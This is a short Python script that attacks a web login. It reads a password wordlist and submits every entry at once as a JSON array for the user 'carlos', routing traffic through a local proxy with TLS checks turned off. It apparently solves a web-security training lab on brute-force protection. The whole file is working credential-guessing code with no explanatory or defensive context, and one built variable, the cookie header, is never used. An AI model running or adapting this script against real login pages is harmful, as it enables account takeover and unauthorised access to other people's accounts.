import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if(len(sys.argv) != 2): 
    print("Usage: different_response.py <url>")
    sys.exit(0)

url = sys.argv[1]
#word = sys.argv[2]

r = requests.get(url)
#print(r.text)
cookie_value = r.cookies['session']
#print(cookie_value)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

file2 = open('creds/passwords1','r')
passwords = file2.readlines()
password = ""
username = "carlos"
ps = []

for passwd in passwords:
    ps.append(passwd[:-1])

try:
    data = {"username" : username, "password" : ps}
    headers = {"Cookie" : "session=" + cookie_value}
    
    p = requests.post(url+'login',json=data, proxies=proxies,verify=False,allow_redirects = False)
    print(p.cookies['session'])
except:
    print("error")

